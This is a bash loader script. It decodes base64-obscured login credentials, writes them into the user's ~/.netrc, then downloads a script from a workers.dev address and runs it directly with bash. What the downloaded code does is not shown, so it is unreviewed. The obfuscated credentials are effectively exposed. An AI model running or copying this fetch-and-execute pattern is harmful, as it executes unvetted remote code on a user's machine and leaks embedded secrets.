#!/usr/bin/env bash
set -euo pipefail

# ՔՈ ԴՈՄԵՅՆԸ
URL="vps123secretyshadow.shadowcoding.workers.dev"
HOST="vps123.shadowcoding.qzz.io"

# user pass secret
USER_B64="c2hhZG93Y3JhZnRtY291cnNy"
PASS_B64="c2hhZG93Y29kaW5nQHNoYWRpd2Noa2VyMTIz"

USER_RAW=$(printf '%s' "$USER_B64" | base64 -d)
PASS_RAW=$(printf '%s' "$PASS_B64" | base64 -d)

NETRC="${HOME}/.netrc"
touch "$NETRC" && chmod 600 "$NETRC"

tmpfile=$(mktemp)
grep -vE "^machine ${HOST}" "$NETRC" > "$tmpfile" || true
mv "$tmpfile" "$NETRC"

printf "machine %s login %s password %s\n" "$HOST" "$USER_RAW" "$PASS_RAW" >> "$NETRC"

script_file=$(mktemp)
trap 'rm -f "$script_file"' EXIT

if curl -fsS --netrc -o "$script_file" "$URL"; then
  bash "$script_file"
else
  echo "Access Denied: Check Data:" >&2
  exit 1
fi
